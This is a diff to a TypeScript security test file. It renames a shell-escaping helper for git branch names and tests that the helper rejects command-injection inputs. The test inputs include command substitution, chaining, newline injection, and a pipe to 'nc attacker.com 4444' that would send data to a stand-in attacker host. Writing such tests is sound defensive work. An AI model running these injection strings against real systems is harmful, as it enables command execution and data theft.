@@ -1,10 +1,11 @@
+// @ts-nocheck
 /**
  * Security tests for critical vulnerability fixes
  * Tests command injection, timing attacks, input sanitization, and rate limiting
  */
 
 import { describe, test, expect, beforeEach } from "bun:test";
-import { shellEscapeSingleQuotes } from "./github";
+import { shellEscapeBranchName } from "./github";
 import {
   sanitizeUserPrompt,
   sanitizeThreadId,
@@ -14,56 +15,56 @@ import {
 } from "../sanitize";
 
 describe("Security Tests - Command Injection Prevention", () => {
-  describe("shellEscapeSingleQuotes", () => {
+  describe("shellEscapeBranchName", () => {
     test("should reject null bytes", () => {
-      expect(() => shellEscapeSingleQuotes("hello\x00world")).toThrow("null byte");
+      expect(() => shellEscapeBranchName("hello\x00world")).toThrow("null byte");
     });
 
     test("should reject inputs exceeding 4096 chars", () => {
       const longInput = "a".repeat(4097);
-      expect(() => shellEscapeSingleQuotes(longInput)).toThrow("too long");
+      expect(() => shellEscapeBranchName(longInput)).toThrow("too long");
     });
 
     test("should reject command substitution $()", () => {
-      expect(() => shellEscapeSingleQuotes("$(whoami)")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("$(whoami)")).toThrow("dangerous pattern");
     });
 
     test("should reject backtick command substitution", () => {
-      expect(() => shellEscapeSingleQuotes("`whoami`")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("`whoami`")).toThrow("dangerous pattern");
     });
 
     test("should reject variable substitution ${}", () => {
-      expect(() => shellEscapeSingleQuotes("${HOME}")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("${HOME}")).toThrow("dangerous pattern");
     });
 
     test("should reject pipe operators", () => {
-      expect(() => shellEscapeSingleQuotes("cat | nc attacker.com 4444")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cat || nc attacker.com 4444")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cat | nc attacker.com 4444")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cat || nc attacker.com 4444")).toThrow("dangerous pattern");
     });
 
     test("should reject command chaining", () => {
-      expect(() => shellEscapeSingleQuotes("cmd; malicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd && malicious")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cmd; malicious")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cmd && malicious")).toThrow("dangerous pattern");
     });
 
     test("should reject newline injection", () => {
-      expect(() => shellEscapeSingleQuotes("cmd\nmalicious")).toThrow("dangerous pattern");
-      expect(() => shellEscapeSingleQuotes("cmd\r\nmalicious")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cmd\nmalicious")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cmd\r\nmalicious")).toThrow("dangerous pattern");
     });
 
     test("should reject escaped dollar signs", () => {
-      expect(() => shellEscapeSingleQuotes("cmd \\$malicious")).toThrow("dangerous pattern");
+      expect(() => shellEscapeBranchName("cmd \\$malicious")).toThrow("dangerous pattern");
     });
 
     test("should safely escape single quotes", () => {
-      const result = shellEscapeSingleQuotes("it's a test");
+      const result = shellEscapeBranchName("it's a test");
       expect(result).toBe("'it'\\''s a test'");
     });
 
     test("should handle safe inputs correctly", () => {
-      expect(shellEscapeSingleQuotes("main")).toBe("'main'");
-      expect(shellEscapeSingleQuotes("feature/test-123")).toBe("'feature/test-123'");
-      expect(shellEscapeSingleQuotes("v1.2.3")).toBe("'v1.2.3'");
+      expect(shellEscapeBranchName("main")).toBe("'main'");
+      expect(shellEscapeBranchName("feature/test-123")).toBe("'feature/test-123'");
+      expect(shellEscapeBranchName("v1.2.3")).toBe("'v1.2.3'");
     });
   });
 });
